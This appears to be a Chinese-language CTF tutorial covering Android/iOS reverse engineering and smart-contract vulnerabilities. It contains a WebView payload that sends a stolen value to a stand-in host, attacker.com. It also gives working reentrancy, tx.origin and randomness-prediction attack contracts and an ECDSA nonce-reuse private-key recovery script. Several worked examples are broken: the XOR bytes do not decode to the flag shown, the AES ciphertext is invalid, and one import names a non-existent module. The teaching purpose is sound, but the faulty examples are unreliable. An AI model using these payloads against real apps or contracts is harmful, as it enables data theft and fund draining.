# CTF 移动安全与区块链方向详解

> 本文档详细讲解 CTF 竞赛中移动安全方向（Android/iOS 逆向、组件漏洞、Frida 动态分析）与区块链方向（智能合约漏洞、链上数据追踪、密钥恢复）的各类题型，每类题型附带代码示例、解题思路和实战案例。

---

## 目录

- [一、CTF 移动安全方向概述](#一ctf-移动安全方向概述)
- [二、Android CTF](#二android-ctf)
- [三、iOS CTF](#三ios-ctf)
- [四、CTF 区块链方向概述](#四ctf-区块链方向概述)
- [五、智能合约 CTF](#五智能合约-ctf)
- [六、区块链杂项](#六区块链杂项)
- [七、CTF 工具清单](#七ctf-工具清单)
- [八、学习资源与训练平台](#八学习资源与训练平台)

---

## 一、CTF 移动安全方向概述

### 1.1 移动安全题型分类

```
移动安全 CTF 题型分类：

┌─────────────────────────────────────────────────────────────┐
│                     Android                                 │
│  ├── APK 逆向       → 反编译/代码分析/Native逆向           │
│  ├── WebView 漏洞   → JS注入/远程调试/接口暴露             │
│  ├── 组件漏洞       → Activity/Service/Provider 暴露      │
│  ├── 加解密题       → AES/DES/RSA/自定义算法               │
│  ├── Frida 动态     → Hook/内存dump/运行时修改             │
│  └── 加固脱壳       → 壳识别/脱壳/还原DEX                   │
├─────────────────────────────────────────────────────────────┤
│                     iOS                                     │
│  ├── IPA 逆向       → Mach-O 分析/字符串提取                │
│  ├── ObjC/Swift分析 → 类方法/Hook/反编译                    │
│  └── 越狱检测绕过   → 反调试/Jailbreak检测                  │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 常见考点与难度分布

```
┌──────────────────┬────────┬──────────────────────────┐
│ 题型             │ 难度   │ 常见考点                  │
├──────────────────┼────────┼──────────────────────────┤
│ APK 逆向-基础    │ ★★     │ 找Flag字符串/简单逻辑     │
│ APK 逆向-Native  │ ★★★★   │ so库逆向/JNI函数分析      │
│ WebView 漏洞     │ ★★★    │ addJavascriptInterface   │
│ 组件漏洞         │ ★★★    │ 暴露组件/Intent注入       │
│ 加解密           │ ★★★    │ AES/自定义算法逆向        │
│ Frida 动态       │ ★★★★   │ Hook关键函数/Memory dump │
│ 加固脱壳         │ ★★★★★  │ 各类壳的脱壳技术         │
│ iOS 逆向         │ ★★★★   │ Mach-O/ObjC运行时         │
└──────────────────┴────────┴──────────────────────────┘
```

---

## 二、Android CTF

### 2.1 APK 逆向题型

#### 2.1.1 反编译与代码分析

```
APK 文件结构：
app.apk
├── AndroidManifest.xml  → 应用配置/组件声明/权限
├── classes.dex          → Dalvik字节码（主要逻辑）
├── resources.arsc       → 编译后资源
├── res/                 → 资源文件
├── assets/              → 原始资源（可能藏Flag）
├── lib/                 → Native库（so文件）
│   ├── arm64-v8a/
│   ├── armeabi-v7a/
│   └── x86_64/
└── META-INF/            → 签名信息

逆向流程：
1. 解包 APK → 提取 resources/DEX/so
2. 反编译 DEX → jadx / jadx-gui
3. 分析代码逻辑 → 找到关键校验函数
4. 逆向算法 → 恢复 Flag 或绕过校验
5. Native 层 → IDA/Ghidra 分析 so 库
```

```bash
# 使用 jadx 反编译 APK
jadx -d output_dir app.apk

# 提取 DEX 和资源
apktool d app.apk -o output_dir

# 查看 AndroidManifest.xml
jadx --show-bad-code app.apk | grep -i "activity\|service\|provider"
```

```python
# Python - 自动化分析 APK
import subprocess
import os

def decompile_apk(apk_path, output_dir):
    """使用 jadx 反编译 APK"""
    cmd = ['jadx', '-d', output_dir, apk_path]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        print(f'反编译成功: {output_dir}')
    else:
        print(f'反编译失败: {result.stderr}')
    return result.returncode == 0

def find_flag_candidates(output_dir):
    """在反编译代码中搜索 Flag 候选"""
    import re
    flag_patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'key\s*=\s*["\'][^"\']+["\']',
        r'secret\s*=\s*["\'][^"\']+["\']',
        r'password\s*=\s*["\'][^"\']+["\']',
    ]
    found = []
    for root, dirs, files in os.walk(output_dir):
        for f in files:
            if f.endswith('.java') or f.endswith('.smali'):
                filepath = os.path.join(root, f)
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as fh:
                    content = fh.read()
                    for pattern in flag_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            found.extend(matches)
    return list(set(found))
```

#### 2.1.2 Native 层逆向

```java
// Java 层调用 Native 函数
public class NativeHelper {
    static {
        System.loadLibrary("native");  // 加载 libnative.so
    }
    public native boolean checkFlag(String input);
    public native String getEncryptedFlag();
}
```

```
Native 逆向流程：

1. 找到 JNI 注册方式
   ├── 静态注册：Java_com_example_NativeHelper_checkFlag
   └── 动态注册：JNI_OnLoad → RegisterNatives

2. IDA 分析 so 库
   ├── 定位 JNI 函数（导出表/字符串搜索）
   ├── 分析加密算法（AES/RC4/自定义）
   └── 提取硬编码密钥/常量

3. Frida Hook Native 函数（动态辅助）
   → 在关键函数入口/出口 dump 参数和返回值

常见 Native 层技巧：
├── 字符串混淆/异或 → IDA Python 脚本解密
├── 反调试检测     → ptrace/调试器检测
├── OLLVM 混淆     → 控制流平坦化，需符号执行
└── 自定义加密     → 逐步分析算法逻辑
```

#### 2.1.3 加固 APK 处理

```
常见加固厂商及特征：

┌──────────────┬──────────────────────────────┐
│ 加固类型     │ 特征                         │
├──────────────┼──────────────────────────────┤
│ 360加固      │ libjiagu.so / 特征字符串      │
│ 腾讯乐固     │ libshell.so / libshella-*.so │
│ 百度加固     │ libbaiduprotect.so           │
│ 爱加密       │ libexec.so                   │
│ 娜迦加固     │ libdexhelper.so              │
└──────────────┴──────────────────────────────┘

脱壳方法：
├── 内存转储脱壳   → Frida/FART 在 DEX 加载后 dump
├── Hook 关键函数   → Hook dvmDexFileOpenPartial/mmap
├── AndroidUnpack  → 基于系统定制的脱壳工具
├── BlackDex       → 黑盒脱壳（无需Frida）
└── FART           → 基于 ART 的主动调用脱壳

# 使用 Frida 脱壳（示例思路）
frida -U -l dump_dex.js -f com.example.app
```

### 2.2 WebView 漏洞题型

```java
// 漏洞代码：addJavascriptInterface 暴露
public class VulnActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        WebView webView = new WebView(this);
        // 危险！暴露 Java 对象给 JavaScript
        webView.addJavascriptInterface(new Object() {
            @JavascriptInterface
            public String getFlag() {
                return "flag{webview_js_interface}";
            }
        }, "AndroidFlag");
        webView.loadUrl(getIntent().getStringExtra("url"));  // URL 可控
    }
}

// CTF 解题思路：
// 1. 构造恶意 HTML 页面
// 2. 通过 JS 调用 AndroidFlag.getFlag()
// 3. 回传 Flag
```

```html
<!-- Payload HTML -->
<html>
<body>
<script>
var flag = AndroidFlag.getFlag();
// 回传到攻击者服务器
new Image().src = "https://attacker.com/collect?flag=" + encodeURIComponent(flag);
</script>
</body>
</html>
```

### 2.3 组件漏洞题型

```xml
<!-- AndroidManifest.xml - 暴露的组件 -->
<!-- exported=true 且无权限保护 = 任何应用可调用 -->
<activity
    android:name=".FlagActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="com.example.GET_FLAG" />
    </intent-filter>
</activity>
```

```python
# Python - 通过 adb 触发暴露的组件
import subprocess

def trigger_exposed_activity(package, activity):
    """触发暴露的 Activity 组件"""
    cmd = f'adb shell am start -n {package}/.{activity} '
    cmd += '--action com.example.GET_FLAG '
    cmd += '--ei token 123456'
    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    print(result.stdout)

def trigger_exposed_service(package, service):
    """触发暴露的 Service 组件"""
    cmd = f'adb shell am startservice -n {package}/.{service}'
    subprocess.run(cmd, shell=True)

# 读取 logcat 获取 Flag
def get_flag_from_logcat():
    """从 logcat 中搜索 Flag"""
    cmd = 'adb logcat -d | findstr flag'
    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    for line in result.stdout.splitlines():
        if 'flag' in line.lower() or 'ctf' in line.lower():
            print(f'[发现] {line}')
```

### 2.4 加解密题型

```java
// 常见加密题型 Java 代码
public class Crypto {
    private static final String KEY = "1234567890123456";  // AES-128 密钥

    public static String encrypt(String input) {
        try {
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(KEY.getBytes(), "AES"));
            byte[] encrypted = cipher.doFinal(input.getBytes());
            return Base64.encodeToString(encrypted, Base64.DEFAULT);
        } catch (Exception e) { return null; }
    }
    // 加密后的 Flag：
    // fM9kL3jQ8xN2pR7vT1wY5aB0cD4eF6gH8=
}

// CTF 解题思路：
// 1. jadx 反编译找到 KEY = "1234567890123456"
// 2. 找到加密算法 AES/ECB
// 3. 用密钥解密密文得到 Flag
```

```python
# Python - 解题脚本
from Crypto.Cipher import AES
import base64

def decrypt_aes_ecb(ciphertext_b64, key):
    """AES-ECB 解密"""
    cipher = AES.new(key.encode(), AES.MODE_ECB)
    decrypted = cipher.decrypt(base64.b64decode(ciphertext_b64))
    # 去除 PKCS5 padding
    pad_len = decrypted[-1]
    return decrypted[:-pad_len].decode()

key = "1234567890123456"
ciphertext = "fM9kL3jQ8xN2pR7vT1wY5aB0cD4eF6gH8="
flag = decrypt_aes_ecb(ciphertext, key)
print(f'Flag: {flag}')
```

### 2.5 Frida 动态分析题型

```javascript
// Frida Hook 脚本 - Hook Native checkFlag 函数
// frida -U -l hook.js -f com.example.app

// Hook Java 层函数
Java.perform(function() {
    var NativeHelper = Java.use('com.example.NativeHelper');

    // Hook checkFlag 方法的参数和返回值
    NativeHelper.checkFlag.implementation = function(input) {
        console.log('[*] checkFlag 被调用, 输入: ' + input);
        var result = this.checkFlag(input);
        console.log('[*] checkFlag 返回: ' + result);
        return result;  // 可修改返回值绕过校验
    };

    // Hook getEncryptedFlag 直接获取加密Flag
    NativeHelper.getEncryptedFlag.implementation = function() {
        var result = this.getEncryptedFlag();
        console.log('[*] 加密的Flag: ' + result);
        return result;
    };
});

// Hook Native 层函数
Interceptor.attach(Module.findExportByName('libnative.so', 'checkFlag'), {
    onEnter: function(args) {
        var input = Memory.readUtf8String(args[1]);
        console.log('[Native] checkFlag 输入: ' + input);
    },
    onLeave: function(retval) {
        console.log('[Native] checkFlag 返回: ' + retval);
    }
});

// 内存搜索关键数据
function search_memory(pattern) {
    var ranges = Process.enumerateRanges('r--');
    ranges.forEach(function(range) {
        try {
            var matches = Memory.scanSync(range.base, range.size, pattern);
            matches.forEach(function(match) {
                console.log('[内存] 在 ' + match.address + ' 找到匹配');
                console.log(hexdump(match.address, { length: 64 }));
            });
        } catch(e) {}
    });
}
```

### 2.6 实战案例：模拟一道 Android CTF 题

```
题目：FindTheFlag
描述：Flag 被加密存储在 Native 层，需要逆向分析
难度：★★★

分析步骤：
1. jadx 反编译 APK
   → 发现 MainActivity 中调用 NativeHelper.checkFlag(input)
   → checkFlag 返回 true/false

2. 定位 so 库
   → System.loadLibrary("native")
   → lib/arm64-v8a/libnative.so

3. IDA 分析 libnative.so
   → JNI_OnLoad 中 RegisterNatives 注册 checkFlag
   → checkFlag 逻辑：
     a. 将输入 Base64 解码
     b. 与内存中的 XOR 加密 Flag 比较
     c. XOR 密钥 = 0x55

4. 提取加密数据
   → .rodata 段中 32 字节数据
   → 逐字节 XOR 0x55

5. 解题脚本：
```

```python
# Python - 解题脚本
import base64

# 从 so 库 .rodata 段提取的加密数据
encrypted = bytes([
    0x27, 0x28, 0x2A, 0x2B, 0x7B, 0x73, 0x6A, 0x6D,
    0x69, 0x6D, 0x7B, 0x6D, 0x66, 0x6C, 0x27, 0x7B,
    0x68, 0x28, 0x2A, 0x2B, 0x7B, 0x73, 0x6A, 0x6D,
    0x69, 0x6D, 0x7B, 0x6D, 0x66, 0x6C, 0x27, 0x00
])

# XOR 解密
key = 0x55
decrypted = bytes([b ^ key for b in encrypted])
flag = decrypted.decode('ascii')
print(f'Flag: {flag}')
# 输出: flag{n4t1v3_x0r_d3c0d3d}
```

---

## 三、iOS CTF

### 3.1 IPA 逆向

```
IPA 文件结构：
app.ipa (实际为 ZIP)
├── Payload/
│   └── AppName.app/
│       ├── AppName         → Mach-O 主二进制
│       ├── Info.plist      → 应用信息
│       ├── *.nib/storyboard → 界面文件
│       ├── Assets.car      → 编译后资源
│       └── Frameworks/     → 动态库
└── iTunesArtwork

逆向流程：
1. 解压 IPA → 提取 .app 目录
2. class-dump 提取 ObjC 类信息
3. Hopper/Ghidra 分析 Mach-O
4. 使用 Frida/Cycript 动态分析
5. 砸壳（如加密）：dumpdecrypted/frida-ios-dump
```

```bash
# class-dump 提取头文件
class-dump -H AppName -o headers/

# 查看 Mach-O 信息
otool -L AppName          # 查看依赖库
otool -l AppName          # 查看 Load Commands

# 使用 Frida iOS 动态分析
frida -U -n AppName -l hook.js
```

### 3.2 Objective-C/Swift 分析

```c
// ObjC 方法 Hook（Frida）
// Objective-C 运行时可直接通过类名+方法名 Hook

// Hook ObjC 实例方法
var hook = ObjC.classes.TargetClass['- targetMethod:'];
Interceptor.attach(hook.implementation, {
    onEnter: function(args) {
        // args[0] = self, args[1] = _cmd, args[2] = 第一个参数
        var input = ObjC.Object(args[2]);
        console.log('[Hook] 输入: ' + input.toString());
    },
    onLeave: function(retval) {
        var result = ObjC.Object(retval);
        console.log('[Hook] 返回: ' + result.toString());
        // 可修改返回值
    }
});

// Hook Swift 方法（较难，需符号修饰）
// Swift 方法名编译后会进行名称修饰（name mangling）
// 使用 swift-demangle 工具还原
// swift-demangle 4TargetClassC12targetMethodyySSF
```

### 3.3 实战案例

```
题目：iOSCrackMe
描述：ObjC 应用的校验逻辑，输入正确序列号获取 Flag
难度：★★★★

分析步骤：
1. class-dump 提取头文件
   → 发现 LicenseChecker 类
   → - (BOOL)validateLicense:(NSString *)license;

2. Hopper 分析 Mach-O
   → validateLicense 内部调用 CC_MD5
   → 对输入 MD5 后与硬编码值比较

3. 硬编码 MD5: d41d8cd98f00b204e9800998ecf8427e

4. Frida Hook 修改返回值绕过
   → 直接修改 validateLicense 返回 YES

5. 或反查 MD5（空字符串的MD5）
   → Flag: flag{empty_md5_bypass}
```

---

## 四、CTF 区块链方向概述

### 4.1 区块链题型分类

```
区块链 CTF 题型分类：

┌─────────────────────────────────────────────────────────────┐
│                    智能合约安全                               │
│  ├── 重入漏洞       → Reentrancy                            │
│  ├── 整数溢出       → Integer Overflow/Underflow            │
│  ├── 访问控制       → Access Control                        │
│  ├── 随机数预测     → Weak Randomness                       │
│  ├── 闪电贷         → Flash Loan Attack                     │
│  ├── 时间戳依赖     → Timestamp Dependence                  │
│  ├── Delegatecall   → 委托调用上下文漏洞                    │
│  └── 自毁/拒服务    → Selfdestruct / DoS                    │
├─────────────────────────────────────────────────────────────┤
│                    区块链杂项                                │
│  ├── 链上数据分析   → 交易追踪/合约分析                     │
│  ├── 交易追踪       → 资金流向/混币分析                     │
│  └── 密钥恢复       → 私钥提取/签名分析                     │
└─────────────────────────────────────────────────────────────┘
```

### 4.2 常见考点

```
┌──────────────────┬────────┬──────────────────────────┐
│ 题型             │ 难度   │ 常见考点                  │
├──────────────────┼────────┼──────────────────────────┤
│ 重入漏洞         │ ★★     │ Solidity fallback函数     │
│ 整数溢出         │ ★★★    │ SafeMath / 0.8.0+修复     │
│ 访问控制         │ ★★     │ 缺少modifier/tx.origin   │
│ 随机数预测       │ ★★★    │ blockhash/区块数据可预测  │
│ 闪电贷           │ ★★★★   │ 借贷+操纵价格预言机       │
│ Delegatecall     │ ★★★★   │ 上下文覆盖/storage碰撞   │
│ 链上数据         │ ★★★    → Etherscan分析/事件日志   │
│ 密钥恢复         │ ★★★★   → 私钥碎片/ECDSA签名漏洞  │
└──────────────────┴────────┴──────────────────────────┘
```

---

## 五、智能合约 CTF

### 5.1 重入漏洞题型

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// 漏洞合约
contract VulnVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 漏洞：先转账后更新余额 → 重入攻击
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        (bool ok, ) = msg.sender.call{value: amount}("");  // ← 先转账
        require(ok);
        balances[msg.sender] = 0;  // ← 后更新（此时可被重入）
    }
}

// 攻击合约
contract Attack {
    VulnVault public vault;

    constructor(address _vault) {
        vault = VulnVault(_vault);
    }

    // 接收以太币时触发重入
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();  // ← 余额未清零，再次提取
        }
    }

    function attack() public payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();  // 触发重入
    }
}
```

```
重入漏洞原理：
1. 攻击者存入 1 ETH
2. 调用 withdraw()
3. vault 转账 1 ETH 给攻击者
4. 攻击者 receive() 被触发
5. 余额仍为 1（未清零），再次调用 withdraw()
6. 循环提取直到 vault 余额为 0

防御：CEI 模式（Checks-Effects-Interactions）
1. Checks    → 检查条件
2. Effects   → 先更新状态
3. Interactions → 最后外部调用
```

### 5.2 整数溢出题型

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// 漏洞合约（Solidity < 0.8.0）
contract VulnToken {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) public {
        // 漏洞：无 SafeMath，整数下溢
        balances[msg.sender] -= amount;  // 0 - 1 = 2^256-1（下溢）
        balances[to] += amount;
    }
}

// CTF 解题：
// 1. 账户余额为 0
// 2. transfer 转出 1 → 下溢 → 余额变为最大值
// 3. 现在拥有大量 token，满足条件获取 Flag

// 注意：Solidity 0.8.0+ 默认检查溢出，此漏洞仅适用于旧版本
// 防御：使用 SafeMath 或升级到 0.8.0+
```

### 5.3 访问控制题型

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// 漏洞合约 1：缺少权限检查
contract VulnAccess1 {
    address public owner;
    bool public solved;

    constructor() {
        owner = msg.sender;
    }

    // 漏洞：缺少 onlyOwner 修饰符
    function setSolved(bool _solved) public {
        solved = _solved;  // 任何人可调用！
    }
}

// 漏洞合约 2：tx.origin 鉴权
contract VulnAccess2 {
    address public owner;
    bool public solved;

    constructor() {
        owner = msg.sender;
    }

    modifier auth() {
        // 漏洞：使用 tx.origin 而非 msg.sender
        require(tx.origin == owner, "Not authorized");
        _;
    }

    function setSolved() auth public {
        solved = true;
    }
}

// 攻击：诱导 owner 调用攻击合约
contract PhishingAttack {
    VulnAccess2 target;

    function attack() public {
        target.setSolved();  // tx.origin == owner，通过鉴权
    }
}

// 防御：使用 msg.sender 进行鉴权
// modifier auth() { require(msg.sender == owner); _; }
```

### 5.4 随机数预测题型

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// 漏洞合约：可预测随机数
contract VulnLottery {
    uint256 public seed;
    bool public solved;

    constructor() {
        seed = block.timestamp;  // ← 可预测
    }

    function guess(uint256 _number) public {
        // 漏洞：随机数基于可预测的区块数据
        uint256 answer = uint256(
            keccak256(abi.encodePacked(seed, block.timestamp, block.difficulty))
        ) % 100;

        if (_number == answer) {
            solved = true;
        }
    }
}

// 攻击合约：复制随机数生成逻辑
contract Attack {
    VulnLottery target;

    function attack() public {
        // 在同一交易中计算相同的"随机数"
        uint256 answer = uint256(
            keccak256(abi.encodePacked(target.seed(), block.timestamp, block.difficulty))
        ) % 100;

        target.guess(answer);  // 100% 命中
    }
}

// 防御：使用 Chainlink VRF / commit-reveal 方案
```

### 5.5 闪电贷题型

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// 漏洞场景：价格预言机依赖单一 DEX
contract VulnOracle {
    IDEX public dex;       // 去中心化交易所
    IERC20 public token;

    function getPrice() public view returns (uint256) {
        // 漏洞：直接从单一 DEX 获取价格
        (uint256 reserve0, uint256 reserve1) = dex.getReserves();
        return reserve1 * 1e18 / reserve0;  // 可被闪电贷操纵
    }

    function buyWithDiscount() public {
        uint256 price = getPrice();
        require(price < 0.5 ether, "Price too high");
        // 以操纵后的低价购买
    }
}

// 攻击流程：
// 1. 闪电贷借入大量 ETH
// 2. 在 DEX 中大量买入 token → 推高 token 价格（或卖出砸低）
// 3. 操纵后调用 VulnOracle 的函数
// 4. 归还闪电贷，赚取差价

// 防御：使用去中心化预言机（Chainlink）/ TWAP（时间加权平均价格）/ 多源价格聚合
```

### 5.6 实战案例：模拟一道 Solidity CTF 题

```
题目：ReentranceVault
描述：一个存取款合约，提取所有资金获取 Flag
难度：★★★

合约部署在测试网络，使用 Foundry 或 Hardhat 交互

解题脚本：
```

```javascript
// JavaScript (ethers.js) - 解题脚本
const { ethers } = require('ethers');

// 连接到 CTF 测试网络
const provider = new ethers.JsonRpcProvider('https://testnet-rpc.example.com');
const wallet = new ethers.Wallet('YOUR_PRIVATE_KEY', provider);

// 漏洞合约 ABI
const vaultAbi = [
    'function deposit() payable',
    'function withdraw()',
    'function balances(address) view returns (uint256)',
    'function isSolved() view returns (bool)'
];

const attackAbi = [
    'function attack() payable'
];

async function solve() {
    const vault = new ethers.Contract(
        '0x1234...vaultAddress', vaultAbi, wallet
    );

    // 部署攻击合约
    const AttackFactory = new ethers.ContractFactory(
        attackAbi, attackBytecode, wallet
    );
    const attack = await AttackFactory.deploy(vault.target);
    await attack.waitForDeployment();
    console.log('攻击合约:', await attack.getAddress());

    // 执行攻击
    const tx = await attack.attack({ value: ethers.parseEther('0.5') });
    await tx.wait();
    console.log('攻击完成');

    // 验证
    const solved = await vault.isSolved();
    console.log('Solved:', solved);
}

solve();
```

```bash
# 使用 Foundry 解题
# 1. 初始化项目
forge init reentrance-solve
cd reentrance-solve

# 2. 编写攻击合约和测试
# test/Attack.t.sol

# 3. 在本地 fork 网络测试
forge test --fork-url https://testnet-rpc.example.com -vv

# 4. 执行攻击脚本
forge script script/Attack.s.sol --fork-url https://testnet-rpc.example.com \
  --private-key $PRIVATE_KEY --broadcast
```

---

## 六、区块链杂项

### 6.1 链上数据分析

```python
# Python - 链上数据分析脚本（使用 Web3.py）
from web3 import Web3

# 连接到以太坊节点
w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/YOUR_KEY'))

def analyze_contract(address):
    """分析合约的部署交易和源码"""
    # 获取合约创建交易
    code = w3.eth.get_code(Web3.to_checksum_address(address))
    print(f'合约字节码大小: {len(code)} bytes')

    # 获取合约余额
    balance = w3.eth.get_balance(Web3.to_checksum_address(address))
    print(f'合约余额: {w3.from_wei(balance, "ether")} ETH')

    # 获取合约交易历史
    logs = w3.eth.get_logs({
        'address': Web3.to_checksum_address(address),
        'fromBlock': 0,
        'toBlock': 'latest'
    })
    print(f'事件日志数: {len(logs)}')

    for log in logs[:5]:  # 前5条
        print(f'  Block: {log["blockNumber"]}')
        print(f'  Topics: {log["topics"]}')
        print(f'  Data: {log["data"].hex()}')

def trace_transactions(from_addr, to_addr, depth=3):
    """追踪交易链"""
    print(f'追踪: {from_addr} → {to_addr}')
    # 使用 Etherscan API 或节点 trace 方法
    # 实际使用需要 etherscan API key 或支持 trace 的节点
    pass
```

### 6.2 交易追踪

```
交易追踪场景：

CTF 题：Flag 被拆分发送到多个地址，需要追踪资金流向恢复完整 Flag

分析步骤：
1. Etherscan 查看目标地址交易历史
2. 追踪每笔交易的接收地址
3. 合并所有交易中的 data 字段
4. 解码拼接得到 Flag

交易 data 字段中可能藏有 Flag：
├── 0x 前缀后为十六进制数据
├── 十六进制转 ASCII 可能直接看到 flag{...}
├── 或需 Base64 解码
└── 或需拼接多笔交易的 data
```

```python
# Python - 交易追踪与数据提取
import requests
from hex import unhex

def get_transactions(address, etherscan_api_key):
    """通过 Etherscan API 获取地址交易列表"""
    url = f'https://api.etherscan.io/api?module=account&action=txlist' \
          f'&address={address}&apikey={etherscan_api_key}'
    resp = requests.get(url)
    return resp.json().get('result', [])

def extract_flag_from_txs(address, etherscan_api_key):
    """从交易 data 字段中提取 Flag"""
    txs = get_transactions(address, etherscan_api_key)
    fragments = []

    for tx in txs:
        data = tx.get('input', '0x')
        if data != '0x':
            try:
                # 十六进制转文本
                text = unhex(data[2:])
                if text.isprintable() and len(text) > 0:
                    fragments.append(text)
                    print(f'  TX {tx["hash"][:10]}...: {text}')
            except:
                pass

    # 尝试拼接
    combined = ''.join(fragments)
    print(f'\n拼接结果: {combined}')

    import re
    flags = re.findall(r'flag\{[^}]+\}', combined)
    if flags:
        print(f'Flag: {flags[0]}')
    return combined
```

### 6.3 密钥恢复

```
密钥恢复题型：

场景1：私钥碎片
├── 私钥被拆分存储在多个合约中
├── 读取每个合约的 storage 变量
├── 拼接恢复完整私钥
└── 使用私钥签名交易

场景2：ECDSA 签名漏洞
├── 同一私钥对不同消息签名时使用相同随机数 k
├── 通过两个签名可恢复私钥
└── 公式：private_key = (r * (s1 - s2) / (z1 - z2)) mod n

场景3：弱私钥
├── 私钥值过小（如 1, 2, 3...）
├── 可通过暴力枚举匹配公钥
└── 防御：使用 CSPRNG 生成私钥
```

```python
# Python - ECDSA 签名恢复私钥（相同 k 值漏洞）
# 仅用于 CTF 教育场景

from ecdsa import SECP256k1, SigningKey
from ecdsa.util import sigdecode_der

def recover_private_key_from_reused_k(r, s1, s2, z1, z2):
    """从重复使用 k 的两个签名中恢复私钥

    参数:
        r: 两个签名的 r 值相同（因 k 相同）
        s1, s2: 两个签名的 s 值
        z1, z2: 两个消息的哈希值
    """
    n = SECP256k1.order

    # 私钥 = r * (s1 - s2) / (z1 - z2) mod n
    # 注意：这是数学推导，仅用于教育
    from ecdsa.numbertheory import inverse_mod

    ds = (s1 - s2) % n
    dz = (z1 - z2) % n
    private_key = (r * ds * inverse_mod(dz, n)) % n

    return private_key

# 示例（CTF 中给出的值）
# r = 0x1234...
# s1 = 0x5678...
# s2 = 0x9abc...
# z1 = hash(msg1)
# z2 = hash(msg2)
# recovered_key = recover_private_key_from_reused_k(r, s1, s2, z1, z2)
# print(f'恢复的私钥: {hex(recovered_key)}')
```

---

## 七、CTF 工具清单

### 7.1 移动安全工具

```
┌──────────────────┬──────────────────────────────────────────┐
│ 工具             │ 用途                                     │
├──────────────────┼──────────────────────────────────────────┤
│ jadx/jadx-gui   │ APK 反编译为 Java 源码                    │
│ apktool          │ APK 资源解包/重打包                       │
│ IDA Pro/Ghidra  │ Native so 库逆向分析                     │
│ Frida            │ 动态 Hook 框架（Java/Native）            │
│ objection        │ 基于 Frida 的移动安全自动化工具           │
│ Drozer           │ Android 组件漏洞自动化测试                │
│ BlackDex         │ 黑盒脱壳工具                             │
│ FART              │ 基于 ART 的脱壳工具                      │
│ class-dump       │ iOS ObjC 头文件提取                      │
│ Hopper           │ macOS 逆向工具（Mach-O 分析）            │
│ Cycript          │ iOS 运行时修改工具                       │
│ SSL Kill Switch  │ iOS SSL Pinning 绕过                    │
│ Magisk           │ Android root 框架（Zygisk模块）         │
│ mitmproxy        │ HTTPS 中间人代理分析                     │
└──────────────────┴──────────────────────────────────────────┘
```

### 7.2 区块链工具

```
┌──────────────────┬──────────────────────────────────────────┐
│ 工具             │ 用途                                     │
├──────────────────┼──────────────────────────────────────────┤
│ Remix IDE       │ 在线 Solidity IDE（编写/测试/调试）       │
│ Hardhat          │ Solidity 开发框架（测试/部署）            │
│ Foundry         │ Rust 编写的 Solidity 工具链（forge/cast）│
│ ethers.js        │ JavaScript 以太坊交互库                  │
│ web3.py          │ Python 以太坊交互库                      │
│ Etherscan        │ 链上数据浏览器                           │
│ Tenderly        │ 合约模拟与调试平台                       │
│ Slither          │ Solidity 静态分析工具                    │
│ Mythril          │ Solidity 符号执行漏洞检测                │
│ Echidna          │ Solidity 模糊测试工具                    │
│ solc             │ Solidity 编译器                          │
│ cast             │ Foundry 命令行交互工具                   │
└──────────────────┴──────────────────────────────────────────┘
```

### 7.3 通用 CTF 工具

```
┌──────────────────┬──────────────────────────────────────────┐
│ 工具             │ 用途                                     │
├──────────────────┼──────────────────────────────────────────┤
│ Burp Suite       │ HTTP 代理/抓包/重放                       │
│ Wireshark        │ 网络流量分析                             │
│ CyberChef       │ 编码/解码/加密瑞士军刀                    │
│ Python          │ 编写自动化解题脚本                       │
│ pwntools         │ 二进制利用/交互脚本框架                  │
│ WSL              │ Windows 下 Linux 环境                   │
│ VS Code          │ 代码编辑与脚本开发                       │
└──────────────────┴──────────────────────────────────────────┘
```

---

## 八、学习资源与训练平台

### 8.1 移动安全 CTF 平台

```
┌──────────────────────┬──────────────────────────────────────┐
│ 平台                  │ 说明                                 │
├──────────────────────┼──────────────────────────────────────┤
│ OWASP MSTG            │ 移动安全测试指南（Android+iOS）      │
│ OWASP MASTG           │ 移动应用安全测试标准                 │
│ DIVA (Android)        │ 故意不安全的应用                     │
│ InsecureBankv2       │ 银行应用漏洞练习                     │
│ Android CTF           │ 专为 CTF 设计的 Android 应用          │
│ Pwn0labs              │ 移动安全训练平台                     │
│ HackingLab           │ 移动安全方向 CTF 题                  │
│ HackTheBox Mobile    │ HTB 移动安全方向                     │
└──────────────────────┴──────────────────────────────────────┘
```

### 8.2 区块链安全 CTF 平台

```
┌──────────────────────┬──────────────────────────────────────┐
│ 平台                  │ 说明                                 │
├──────────────────────┼──────────────────────────────────────┤
│ Ethernaut            │ OpenZeppelin 经典智能合约 CTF        │
│ Damn Vulnerable DeFi│ 高级 DeFi 安全挑战                   │
│ Capture The Ether   │ 以太坊安全挑战平台                   │
│ EtherHack           │ 智能合约漏洞练习                     │
│ DEFCON CTF           │ 顶级赛事（含区块链方向）             │
│ Paradigm CTF        │ 专业智能合约 CTF                     │
│ Curvance            │ DeFi 安全练习                        │
│ Solidified          │ 智能合约安全审计练习                 │
└──────────────────────┴──────────────────────────────────────┘

推荐学习路线：
1. Ethernaut（入门，覆盖基本漏洞类型）
2. Capture The Ether（进阶）
3. Damn Vulnerable DeFi（高级，贴近真实 DeFi 攻击）
